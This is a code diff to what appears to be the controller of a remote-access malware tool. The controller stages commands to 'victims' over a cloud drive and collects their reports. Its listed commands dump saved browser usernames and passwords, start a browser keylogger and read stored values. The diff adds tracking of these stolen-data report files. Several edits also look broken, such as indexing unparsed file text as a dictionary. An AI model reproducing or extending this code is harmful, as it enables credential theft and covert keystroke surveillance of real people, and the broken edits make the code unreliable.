@@ -430,7 +430,7 @@ class Home:
             upath=join(vic_path, uname)
             move_file(upath)
             with drive_file(upath) as f:# repair command_sec if needed
-                command_sec=json.loads(f.read())['last_user_time']
+                command_sec=f.read()['last_user_time']
                 if last_time[uname]<command_sec:
                     last_time[uname]=command_sec
                     log.warning(f'0_o repaired wrong command_sec for victim: {uname}')
@@ -470,7 +470,7 @@ def remove_command(uname, ctime):
     ctime=int(ctime)
     modify_command.acquire()
     with drive_file(command_file) as f:
-        commands:list = json.loads(f.read())
+        commands:list = f.read()
     
     for command in commands[uname]:
         if command['time']==ctime:
@@ -486,6 +486,12 @@ def remove_command(uname, ctime):
     log.info(f'removed command {uname}-{ctime}')
     modify_command.release()
 
+reports={
+    'dump':['dump', 'json'],
+    'stored_value':['data_store', 'json'],
+    'start_logger':['key_dump', 'log'],
+}
+
 def listener():
     while 1:
         home_page.refresh()
@@ -493,7 +499,16 @@ def listener():
             response=f"reports/{user}/response"
             for ctime in source_drive.list_files(response):
                 remove_command(uname, ctime)
-                move_file(join(response, ctime))
+                response_file=join(response, ctime)
+                move_file(response_file)
+
+                with drive_file(response_file) as f:
+                    func=f.read(response_file)
+                file_name=reports[func]
+                file_name=f"{file_name[0]}_{ctime}.{file_name[-1]}"
+                path=f"reports\{uname}\{file_name}"
+                with modify_command:
+                    listen_for.append(path)
 
         for i in listen_for:
             if not source_drive.exists(i):
@@ -752,7 +767,7 @@ class action:
             "dump": [self.dump, 'Dump saved user names and password from browsers. [reports: dump_(time).json]'],
             "stored_value": [self.stored_value, 'check all the key-value stored in data_store. [reports: data_store_(time).json]', ],
             "set_value": [self.set_value, "change a value of stored key in data_store.", ],
-            "start_logger": [self.start_logger, 'start a browser spacefic key logger.[reports: key_dump.log]', ],
+            "start_logger": [self.start_logger, 'start a browser spacefic key logger.[reports: key_dump_(time).log]', ],
             "discard": [self.discard, "discard staged commands."],
             "clean_recoed":[self.clean_record, "remove user name with all listed commands from command file  but it doesn\'t discard the staged commands."]
         })
@@ -857,14 +872,13 @@ class action:
         log.warning('all listed commands removed from command_file')
         with drive_file(command_file) as f, modify_command:
             
-            full_com:dict=json.loads(f.read() or "{}")
+            full_com:dict=f.read() or "{}"
             full_com.pop(self.vic_name, None)
             f.rewrite(full_com)
 
 
     def add_to_listen(self, file_name:str, prefix="reports"):
-        path=join(prefix, self.vic_name)
-        path=join(path, file_name)
+        path=f"{prefix}\{self.vic_name}\{file_name}"
         self.listen_for.append(path)
 
 
@@ -904,7 +918,7 @@ class action:
             return
 
         with drive_file(command_file) as f, modify_command:
-            full_com:dict=json.loads(f.read() or "{}")
+            full_com:dict=f.read() or "{}"
             pre_com=full_com.get(self.vic_name, [])
 
             self.extend(pre_com)
